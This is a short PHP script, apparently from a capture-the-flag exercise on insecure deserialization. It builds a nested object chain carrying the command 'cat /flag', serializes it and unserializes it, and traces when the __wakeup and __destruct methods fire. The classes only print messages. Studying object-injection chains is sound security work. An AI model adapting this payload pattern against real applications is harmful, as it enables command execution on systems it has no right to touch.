<?php

class L5D_Upload {
    public $x;
    function __wakeup() {
        echo "Upload Up\n";
    }
    function __destruct() {
        echo "Upload Destruct\n";
    }
}

class L5D_ResetCMD {
	protected $new_cmd;
	public $x;
	function __construct($cmd) {
        $this -> new_cmd = $cmd;
    }

    function __wakeup() {
        echo "ResetCMD Up\n";
    }
    function __destruct() {
        echo "ResetCMD Destruct\n";
    }
}

class L5D_Command {
    function __wakeup() {
        echo "\nCommand Up\n";
    }
    function __destruct() {
        echo "Command Destruct\n";
    }
}

$L5D_Command = new L5D_Command();

$L5D_ResetCMD = new L5D_ResetCMD("cat /flag");
$L5D_ResetCMD -> x = $L5D_Command;

$L5D_Upload = new L5D_Upload();
$L5D_Upload -> x = $L5D_ResetCMD;


$data = serialize($L5D_Upload);
echo $data;
$user_data = unserialize($data);

?>